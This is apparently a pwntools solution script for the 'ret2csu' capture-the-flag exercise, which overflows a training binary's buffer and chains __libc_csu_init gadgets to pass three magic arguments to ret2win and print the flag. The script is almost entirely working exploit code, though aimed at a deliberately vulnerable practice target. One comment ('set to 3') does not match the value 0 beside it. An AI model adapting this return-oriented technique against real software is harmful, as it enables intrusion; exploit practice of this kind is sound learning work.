from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './ret2csu'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

pop_rbx_rbp_r12_r13_r14_15 = 0x40069a
'''
pop		rbx
pop		rbp
pop 	r12
pop 	r13
pop 	r14
pop 	r15
ret
'''
csu_mov = 0x400680
'''
mov 	rdx, r15
mov 	rsi, r14
mov 	edi, r13d
call 	QWORD PTR [r12+rbx*8]
'''
pop_rdi = 0x4006a3
io = start()

payload = flat({
    40: [
    	pop_rbx_rbp_r12_r13_r14_15,
    	0x0,  # rbx (set to 3 because will be incremented and then compared to RBP)
    	0x1,  # rbp -> for cmp
	    0x600e48,  # r12 - ensures we can return to __libc_csu_init
	    0xdeadbeefdeadbeef,  # r13d -> edi
	    0xcafebabecafebabe,  # r14 -> rsi
	    0xd00df00dd00df00d,  # r15 -> rdx
	    csu_mov,  # Move params to where they need to be for function calls
	    p64(0) * 7,  # Deal with the 6 pops
	    pop_rdi,  # Pop deadbeef into RDI again
	    0xdeadbeefdeadbeef,  # We only copied half over earlier (check debugger)
	    elf.sym.ret2win  # pwn???
    ]
})

# gdb.attach(io, gdbscript='''
# init-pwndbg
# break *0x40069a
# break *0x400680
# break *0x400510			
# '''
# # ret2win@plt
# )

io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

flag = io.recv()
success(flag)